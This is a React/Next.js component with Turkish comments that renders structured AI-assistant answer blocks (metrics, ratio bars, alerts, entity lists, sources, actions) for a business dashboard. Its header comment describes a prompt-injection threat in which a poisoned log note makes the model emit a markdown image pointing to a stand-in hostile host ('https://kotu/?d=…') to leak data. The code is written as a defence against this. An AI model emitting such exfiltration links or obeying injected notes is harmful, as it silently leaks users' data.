"use client";

import Link from "next/link";
import type { AiBaglantiKalemi, AiBlok } from "@/lib/api/ai-chat-client";
import { BoxIcon } from "@/components/ui/icons";
import { ekranSebebi, ekranYolu } from "./ai-screen-routes";
import "./ai-panel.css";

/**
 * Yapısal cevap blokları — mockup 152-218 ve 253-312'nin birebir hâli.
 *
 * 🔴🔴 **BU DOSYA MODELİN YAZDIĞI HİÇBİR BAYTA DOKUNMAZ.** Aldığı tek şey
 * backend'in `blocks.py` birleşiminden gelen **yapısal** bloklardır ve onlar
 * araç sonucunun gövdesinden, sunucudaki saf bir eşleyiciyle üretilir.
 *
 * `AiMessage.tsx`teki savunma KALKMADI: model metni hâlâ düz metindir, markdown
 * çözülmez, `dangerouslySetInnerHTML` yoktur ve model metninden `<img>`/`<a>`
 * ÜRETİLMEZ. Zengin görünüm o savunmayı gevşeterek değil, **ayrı bir kanaldan**
 * geldi. (Gerekçe: CSP `img-src 'self'` uzak görseli yüklemese de istek yine
 * çıkar; zehirlenmiş bir günlük notu modele `![](https://kotu/?d=…)`
 * ürettirirse veri tıklama olmadan sızardı.)
 *
 * 🔴 Derin bağlantı hedefi de modelden gelmez: blok bir **ekran anahtarı**
 * taşır, URL'i `ai-screen-routes.ts` bilinen rota kataloğundan kurar.
 */

const TON_SINIFI: Record<string, string> = {
  notr: "notr",
  bilgi: "bilgi",
  olumlu: "olumlu",
  uyari: "uyari",
  kritik: "kritik",
};

function ton(deger: string | null | undefined): string {
  return TON_SINIFI[deger ?? "notr"] ?? "notr";
}

/**
 * Vurguları **birebir eşleyerek** kalınlaştırır (mockup'ın `<strong>`ları).
 *
 * 🔴 İşaretleme veri kanalından GEÇMEZ: backend "şu parçalar kalın" der, metnin
 * içine bir etiket gömmez. Eşleşmeyen bir vurgu sessizce düz bırakılır — bir
 * hata değildir, yalnız vurgusuz bir cümledir.
 */
function Vurgulu({ metin, vurgular }: { metin: string; vurgular: readonly string[] }) {
  if (vurgular.length === 0) return <>{metin}</>;
  const parcalar: React.ReactNode[] = [];
  let kalan = metin;
  let anahtar = 0;
  while (kalan.length > 0) {
    // En erken başlayan vurguyu bul (aynı yerde başlayanlardan en uzunu).
    let enIyi: { indeks: number; vurgu: string } | null = null;
    for (const v of vurgular) {
      if (v.length === 0) continue;
      const i = kalan.indexOf(v);
      if (i === -1) continue;
      if (enIyi === null || i < enIyi.indeks || (i === enIyi.indeks && v.length > enIyi.vurgu.length)) {
        enIyi = { indeks: i, vurgu: v };
      }
    }
    if (enIyi === null) {
      parcalar.push(kalan);
      break;
    }
    if (enIyi.indeks > 0) parcalar.push(kalan.slice(0, enIyi.indeks));
    parcalar.push(<strong key={`v${anahtar++}`}>{enIyi.vurgu}</strong>);
    kalan = kalan.slice(enIyi.indeks + enIyi.vurgu.length);
  }
  return <>{parcalar}</>;
}

/**
 * Derin bağlantı. 🔴 Rotası çözülemeyen anahtar **SİLİNMEZ**, devre dışı +
 * sebep basılır (kanon: "rotası olmayan mockup öğesi silinmez").
 */
function Baglanti({
  kalem,
  className,
  children,
}: {
  kalem: AiBaglantiKalemi;
  className: string;
  children?: React.ReactNode;
}) {
  const yol = ekranYolu(kalem.ekran);
  const icerik = children ?? kalem.etiket;
  if (yol === null) {
    const sebep = ekranSebebi(kalem.ekran);
    return (
      <button type="button" className={`${className} ${className}--disabled`} disabled title={sebep}>
        {icerik}
      </button>
    );
  }
  return (
    <Link href={yol} className={className}>
      {icerik}
    </Link>
  );
}

/** Mockup 154-170 — iki sütunlu metrik kartı. */
function Metrik({ blok }: { blok: Extract<AiBlok, { tip: "metrik" }> }) {
  return (
    <div className={`ai-metric ai-metric--${ton(blok.ton)}`} data-testid="ai-blok-metrik">
      <p className="ai-metric__label">{blok.baslik}</p>
      <p className="ai-metric__value">{blok.deger_metni}</p>
      {blok.alt_metin ? (
        <p className="ai-metric__sub">
          {blok.alt_ton ? (
            <span className={`ai-metric__dot ai-metric__dot--${ton(blok.alt_ton)}`} aria-hidden="true" />
          ) : null}
          {blok.alt_metin}
        </p>
      ) : null}
    </div>
  );
}

/** Mockup 172-192 — yığılmış kâr barı. */
function OranBari({ blok }: { blok: Extract<AiBlok, { tip: "oran_bari" }> }) {
  return (
    <div className={`ai-ratio ai-ratio--${ton(blok.ton)}`} data-testid="ai-blok-oran">
      <div className="ai-ratio__head">
        <div>
          <p className="ai-ratio__label">{blok.baslik}</p>
          <p className="ai-ratio__value">{blok.deger_metni}</p>
        </div>
        <div className="ai-ratio__pct">
          <p className="ai-ratio__pct-value">{blok.yuzde_metni}</p>
          <p className="ai-ratio__pct-label">{blok.yuzde_alt_etiketi}</p>
        </div>
      </div>
      <div className="ai-ratio__bar">
        {blok.dilimler.map((d) => (
          <span
            key={d.etiket}
            className={`ai-ratio__seg ai-ratio__seg--${ton(d.ton)}`}
            style={{ width: `${d.yuzde}%` }}
          />
        ))}
      </div>
      <div className="ai-ratio__legend">
        {blok.dilimler.map((d) => (
          <span key={d.etiket} className={`ai-ratio__leg ai-ratio__leg--${ton(d.ton)}`}>
            {d.alt_etiket}
          </span>
        ))}
      </div>
    </div>
  );
}

/** Mockup 194-201 — sol kenarlı uyarı şeridi. */
function Uyari({ blok }: { blok: Extract<AiBlok, { tip: "uyari" }> }) {
  return (
    <div className={`ai-callout ai-callout--${ton(blok.ton)}`} data-testid="ai-blok-uyari">
      <span className="ai-callout__icon" aria-hidden="true">
        ⚠️
      </span>
      <p className="ai-callout__text">
        <Vurgulu metin={blok.metin} vurgular={blok.vurgular} />
      </p>
    </div>
  );
}

/** Mockup 253-292 — ikonlu + çubuklu + rozetli varlık kartları. */
function VarlikListesi({ blok }: { blok: Extract<AiBlok, { tip: "varlik_listesi" }> }) {
  return (
    <div className="ai-entities" data-testid="ai-blok-varlik">
      {blok.baslik ? <p className="ai-block-heading">{blok.baslik}</p> : null}
      <ul className="ai-entities__list">
        {blok.kalemler.map((k, i) => (
          <li key={`${k.ad}-${i}`} className={`ai-entity ai-entity--${ton(k.ton)}`}>
            <span className={`ai-entity__icon ai-entity__icon--${ton(k.ton)}`} aria-hidden="true">
              <BoxIcon width={17} height={17} />
            </span>
            <span className="ai-entity__body">
              <span className="ai-entity__name">
                {k.baglanti ? (
                  <Baglanti kalem={k.baglanti} className="ai-entity__link">
                    {k.ad}
                  </Baglanti>
                ) : (
                  k.ad
                )}
              </span>
              {k.alt_metin ? <span className="ai-entity__sub">{k.alt_metin}</span> : null}
              {/* 🔴 `doluluk_yuzde` null ise çubuk HİÇ çizilmez: 0 basmak
                  "stok bitti" demektir ve uydurulmuş bir olgudur. */}
              {k.doluluk_yuzde !== null ? (
                <span className="ai-entity__track">
                  <span
                    className={`ai-entity__fill ai-entity__fill--${ton(k.ton)}`}
                    style={{ width: `${k.doluluk_yuzde}%` }}
                  />
                </span>
              ) : null}
            </span>
            {k.rozet_metni ? (
              <span className={`ai-entity__badge ai-entity__badge--${ton(k.ton)}`}>
                {k.rozet_metni}
              </span>
            ) : null}
          </li>
        ))}
      </ul>
    </div>
  );
}

/** Mockup 294-299 — gri özet kutusu. */
function Ozet({ blok }: { blok: Extract<AiBlok, { tip: "ozet" }> }) {
  return (
    <div className="ai-summary" data-testid="ai-blok-ozet">
      <p className="ai-summary__text">
        <Vurgulu metin={blok.metin} vurgular={blok.vurgular} />
      </p>
    </div>
  );
}

/** Mockup 203-211 — "Kaynak" rozet şeridi. Bir KORKULUKTUR, süs değil. */
function Kaynak({ blok }: { blok: Extract<AiBlok, { tip: "kaynak" }> }) {
  return (
    <div className="ai-sources" data-testid="ai-blok-kaynak">
      <p className="ai-block-heading">Kaynak</p>
      <div className="ai-sources__list">
        {blok.kalemler.map((k, i) => (
          <Baglanti key={`${k.ekran}-${i}`} kalem={k} className="ai-source" />
        ))}
      </div>
    </div>
  );
}

/** Mockup 213-218 — aksiyon düğmeleri. */
function Aksiyon({ blok }: { blok: Extract<AiBlok, { tip: "aksiyon" }> }) {
  return (
    <div className="ai-actions" data-testid="ai-blok-aksiyon">
      {blok.kalemler.map((k, i) => (
        <Baglanti
          key={`${k.ekran}-${i}`}
          kalem={k}
          className={k.birincil ? "ai-action ai-action--primary" : "ai-action"}
        />
      ))}
      {/* 🔴 K3: `PDF Rapor` ve `Excel'e Aktar` mockup'ta VAR ama bu dilimin
          KAPSAMI DIŞINDA (kullanıcı bunu tüm sayfalar için genel bir yetenek
          olarak istedi; ölçüm: üretim kilidinde PDF kütüphanesi YOK). Kanon
          gereği SİLİNMEZ — devre dışı + sebep basılır. */}
      <button
        type="button"
        className="ai-action ai-action--disabled"
        disabled
        title={DISA_AKTARIM_SEBEBI}
      >
        PDF Rapor
      </button>
      <button
        type="button"
        className="ai-action ai-action--disabled"
        disabled
        title={DISA_AKTARIM_SEBEBI}
      >
        Excel&apos;e Aktar
      </button>
    </div>
  );
}

export const DISA_AKTARIM_SEBEBI =
  "Dışa aktarma tüm ekranlar için ayrı bir dilimde açılacak; bu sürümde kapalı.";

export interface AiBlockListProps {
  bloklar: readonly AiBlok[];
}

/** Blok listesini sırayla çizer. Tanınmayan `tip` SESSİZCE atlanır. */
export function AiBlockList({ bloklar }: AiBlockListProps) {
  if (bloklar.length === 0) return null;
  const metrikler = bloklar.filter((b): b is Extract<AiBlok, { tip: "metrik" }> => b.tip === "metrik");
  const digerleri = bloklar.filter((b) => b.tip !== "metrik");
  return (
    <div className="ai-blocks">
      {/* Mockup 153: metrik kartları İKİ SÜTUNLU bir ızgarada toplanır. */}
      {metrikler.length > 0 ? (
        <div className="ai-metrics">
          {metrikler.map((b, i) => (
            <Metrik key={`m${i}`} blok={b} />
          ))}
        </div>
      ) : null}
      {digerleri.map((blok, i) => {
        switch (blok.tip) {
          case "oran_bari":
            return <OranBari key={`b${i}`} blok={blok} />;
          case "uyari":
            return <Uyari key={`b${i}`} blok={blok} />;
          case "varlik_listesi":
            return <VarlikListesi key={`b${i}`} blok={blok} />;
          case "ozet":
            return <Ozet key={`b${i}`} blok={blok} />;
          case "kaynak":
            return <Kaynak key={`b${i}`} blok={blok} />;
          case "aksiyon":
            return <Aksiyon key={`b${i}`} blok={blok} />;
          default:
            return null;
        }
      })}
    </div>
  );
}
